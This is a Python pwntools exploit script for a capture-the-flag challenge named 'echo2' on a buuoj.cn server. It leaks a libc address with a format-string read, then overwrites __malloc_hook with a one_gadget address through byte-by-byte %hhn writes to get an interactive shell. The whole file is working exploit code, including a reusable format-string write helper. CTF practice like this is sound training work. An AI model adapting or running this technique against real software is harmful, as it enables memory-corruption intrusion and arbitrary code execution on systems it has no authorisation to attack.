import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
#context.arch='amd64'
while True :
	# try :
		binary='echo2'
		elf=ELF(binary)
		pdbg=pwn_debug(binary)
		pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
		pdbg.debug("2.23")
		pdbg.remote('node3.buuoj.cn',25549)
		pdbg.context.log_level='debug'
		one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		if len(sys.argv)==1 :
			io=pdbg.run("local")
			#io=pdbg.run("debug")
		else :
			io=pdbg.run("remote")

		libc=pdbg.libc

		def fmt(addr1,addr2,off):

			arg0=(addr1)&0xff
			arg1=(addr1&0xff00)>>8
			arg2=(addr1&0xff0000)>>16
			arg3=(addr1&0xff000000)>>24
			arg4=(addr1&0xff00000000)>>32
			arg5=(addr1&0xff0000000000)>>40
			# arg6=(addr1&0xff000000000000)>>48
			# arg7=(addr1&0xff00000000000000)>>56
			#pay=fmtstr_payload(8,{elf.got['printf']:system_addr})
			pay1='%'+str(arg0)+'c%'+str(off+10)+'$hhn'
			pay2='%'+str((arg1-arg0+0x100)%0x100)+'c%'+str(off+11)+'$hhn'
			pay3='%'+str((arg2-arg1+0x100)%0x100)+'c%'+str(off+12)+'$hhn'
			pay4='%'+str((arg3-arg2+0x100)%0x100)+'c%'+str(off+13)+'$hhn'
			pay5='%'+str((arg4-arg3+0x100)%0x100)+'c%'+str(off+14)+'$hhn'
			pay6='%'+str((arg5-arg4+0x100)%0x100)+'c%'+str(off+15)+'$hhn'
			# pay7='%'+str((arg6-arg5+0x100)%0x100)+'c%10$hhn'
			# pay8='%'+str((arg7-arg6+0x100)%0x100)+'c%10$hhn'
			
			pay=pay1+pay2+pay3+pay4+pay5+pay6
			pay+='%100110c'
			pay=pay.ljust(0x50,'\x00')
			for i in range(6):
				pay+=p64(addr2+i)
			io.sendline(pay)




		io.sendline('%30$p')
		libc_base=int(io.recvline(),16)-libc.sym['_IO_2_1_stdout_']
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		fmt(libc_base+one_gadgaet[1],libc.sym['__malloc_hook'],6)
		success('libc_base:'+hex(libc_base))




		gdb.attach(io)
		pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue